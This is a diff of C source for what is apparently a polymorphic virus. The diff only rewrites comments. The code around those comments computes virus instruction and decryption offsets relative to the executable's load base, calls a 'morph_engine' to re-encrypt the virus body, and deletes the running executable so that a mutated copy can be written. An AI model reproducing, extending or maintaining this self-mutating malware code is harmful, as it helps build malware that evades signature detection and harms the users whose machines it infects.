@@ -20,7 +20,7 @@ char *filename;
 extern int morph_engine(char* exe_data, size_t virus_instruction_begin, size_t virus_encrypt_size, size_t virus_decrypt_offset);
 int getfilename(int argc, char *argv[]){
 
-	// get the file name from argument
+	// Get file name
 	filename = argv[0];
 
 	return 0;
@@ -30,12 +30,11 @@ int polymorphic(unsigned long virus_instruction_begin, unsigned long virus_encry
 {
 
 
-	// seed the random number generator
+	// Seed the random number generator
 	srand(time(NULL));
 
-	// calculate offset of virus_instruction_begin in relative to base address of executable
+	// Calculate offsets relative to base
 	virus_instruction_begin = virus_instruction_begin - _LOAD_;
-	// calculate offset of virus_decrypt_offset in relative to base address of executable
 	virus_decrypt_offset = virus_decrypt_offset - _LOAD_;
 
 
@@ -56,7 +55,7 @@ int polymorphic(unsigned long virus_instruction_begin, unsigned long virus_encry
 
 
 
-	// call the polymorphic engine
+	// Call the polymorphic engine
 	if(morph_engine(string, virus_instruction_begin, virus_encrypt_size, virus_decrypt_offset) != 0)
 	{
 		printf("Error in polymorphic engine\n");
@@ -65,7 +64,7 @@ int polymorphic(unsigned long virus_instruction_begin, unsigned long virus_encry
 		return 0;
 	}
 
-	// important, remove the file if not the write will fail later on
+	// Delete current executable
 	remove(filename);
 
 
